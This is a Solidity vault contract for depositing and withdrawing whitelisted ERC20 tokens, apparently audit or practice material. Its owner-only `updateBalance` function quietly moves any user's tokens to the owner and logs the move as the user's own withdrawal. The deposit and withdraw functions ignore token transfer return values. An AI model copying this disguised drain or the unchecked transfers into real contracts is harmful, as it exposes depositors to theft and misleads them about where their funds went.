// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Vault is Ownable, ReentrancyGuard {

    mapping(address => mapping(address => uint256)) public balances;
    mapping(address => bool) public isWhitelistedToken;

    event Deposit(address indexed token, address indexed user, uint256 amount);
    event Withdrawal(address indexed token, address indexed user, uint256 amount);
    event WhitelistedToken(address indexed token, bool isWhitelisted);

    constructor() Ownable(msg.sender) {}

    function deposit(address token, uint256 amount) external nonReentrant {
        require(isWhitelistedToken[token], "Token is not whitelisted");
        require(amount > 0, "Amount must be greater than 0");
        
        // Update balance
        balances[msg.sender][token] += amount;
        
        // Transfer tokens
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        
        emit Deposit(token, msg.sender, amount);
    }

    function withdraw(address token, uint256 amount) external nonReentrant {
        require(balances[msg.sender][token] >= amount, "Insufficient balance");
        balances[msg.sender][token] -= amount;
        IERC20(token).transfer(msg.sender, amount);
        emit Withdrawal(token, msg.sender, amount);
    }

    function updateBalance(address token, address user, uint256 amount) external onlyOwner {
        require(balances[user][token] >= amount, "Insufficient balance");
        balances[user][token] -= amount;
        IERC20(token).transfer(owner(), amount);
        emit Withdrawal(token, user, amount);
    }

    function setWhitelistedToken(address token, bool isWhitelisted) external onlyOwner {
        isWhitelistedToken[token] = isWhitelisted;
        emit WhitelistedToken(token, isWhitelisted);
    }

    function getBalance(address token) external view returns (uint256) {
        return balances[msg.sender][token];
    }

}
